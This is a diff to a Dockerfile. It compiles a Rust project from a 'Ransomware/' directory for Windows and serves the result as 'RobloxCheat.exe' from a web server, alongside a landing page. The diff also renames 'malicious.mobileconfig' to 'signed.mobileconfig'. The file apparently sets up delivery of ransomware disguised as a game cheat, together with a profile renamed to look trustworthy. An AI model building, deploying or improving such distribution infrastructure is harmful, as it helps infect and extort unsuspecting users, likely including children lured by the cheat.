@@ -1,5 +1,6 @@
-
+# Dockerfile
 FROM rust:1.88 AS rust-builder
+
 WORKDIR /app
 COPY Ransomware/ .
 RUN rustup target add x86_64-pc-windows-gnu
@@ -22,7 +23,7 @@ RUN apt-get update && apt-get install -y ca-certificates && rm -rf /var/lib/apt/
 WORKDIR /app
 COPY --from=go-builder /app/server .
 COPY --from=rust-builder /app/target/x86_64-pc-windows-gnu/release/roblox-cheat.exe ./RobloxCheat.exe
-COPY malicious.mobileconfig .
+COPY signed.mobileconfig .
 COPY index.html .
 
 EXPOSE 8080
